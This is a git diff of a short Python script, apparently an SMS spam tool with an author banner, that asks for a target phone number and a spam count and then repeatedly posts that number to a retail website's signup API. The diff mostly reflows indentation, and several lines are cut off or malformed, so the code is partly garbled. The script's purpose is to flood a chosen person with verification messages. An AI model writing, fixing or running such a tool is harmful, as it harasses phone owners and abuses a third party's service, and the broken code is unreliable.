@@ -1,4 +1,3 @@
-
 import json
 #coding:utf-8
 import json
@@ -10,22 +9,23 @@ def main():
         os.system('clear')
         os.system('figlet pieter')
 
-                                                                        [+]AUTHOR :Pieter parker
+        [+]AUTHOR :Pieter parker
         [+]Facebook :Pitrah Arya Abadi
         """)
-                                                                        print(banner)
+        print(banner)
         no = input('target : ')
         jum = input('jumlah spam : ')
 
         head = {
         "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/>
-        "https" :"//www.mapclub.com/en/user/signup"                     "Host" : "cmsapi.mapclub.com",
+        "https" :"//www.mapclub.com/en/user/signup"                     
+        "Host" : "cmsapi.mapclub.com",
         }
 
         dat = {
         'phone' : no
         }
-                                                                        for x in range(int(jum)):
+        for x in range(int(jum)):
                 leosureo = requests.post("https://cmsapi.mapclu>
         if 'eror' in leosureo:
                 print('gagal mengirim' + no)
